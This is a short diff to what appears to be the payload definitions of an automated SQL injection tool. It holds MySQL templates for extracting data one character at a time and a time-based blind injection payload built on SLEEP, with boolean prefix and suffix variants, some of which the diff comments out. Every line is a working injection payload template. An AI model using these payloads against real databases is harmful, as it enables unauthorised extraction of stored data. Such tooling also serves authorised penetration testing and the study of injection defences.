@@ -51,8 +51,8 @@ LENGTH_PAYLOADS = {
 
 DATA_EXTRACTION_PAYLOADS = {
     "MySQL": {
-        "ASC": "ORD(MID(IFNULL({query},0x20),{position},1))={char}",
         "ASCII": "ORD(MID({query},{position},1))={char}",
+        "ASC": "ORD(MID(IFNULL({query},0x20),{position},1))={char}",
         "CHAR": "MID({query},{position},1)=CHAR({char})",
     },
     "Oracle": {
@@ -465,19 +465,19 @@ PAYLOADS = {
                 "payload": "SLEEP([SLEEPTIME])",
                 "comments": [
                     {"pref": " AND ", "suf": ""},
-                    {"pref": " OR ", "suf": ""},
+                    # {"pref": " OR ", "suf": ""},
                     {"pref": " AND ", "suf": "-- wXyW"},
-                    {"pref": " OR ", "suf": "-- wXyW"},
+                    # {"pref": " OR ", "suf": "-- wXyW"},
                     {"pref": "' AND ", "suf": "-- wXyW"},
-                    {"pref": "' OR ", "suf": "-- wXyW"},
+                    # {"pref": "' OR ", "suf": "-- wXyW"},
                     {"pref": '" AND ', "suf": "-- wXyW"},
-                    {"pref": '" OR ', "suf": "-- wXyW"},
+                    # {"pref": '" OR ', "suf": "-- wXyW"},
                     {"pref": ") AND ", "suf": "-- wXyW"},
-                    {"pref": ") OR ", "suf": "-- wXyW"},
+                    # {"pref": ") OR ", "suf": "-- wXyW"},
                     {"pref": "') AND ", "suf": "-- wXyW"},
-                    {"pref": "') OR ", "suf": "-- wXyW"},
+                    # {"pref": "') OR ", "suf": "-- wXyW"},
                     {"pref": '") AND ', "suf": "-- wXyW"},
-                    {"pref": '") OR ', "suf": "-- wXyW"},
+                    # {"pref": '") OR ', "suf": "-- wXyW"},
                 ],
                 "title": "MySQL >= 5.0.12 time-based blind (SLEEP)",
                 "vector": "0986=IF(([INFERENCE]),SLEEP([SLEEPTIME]),986)",
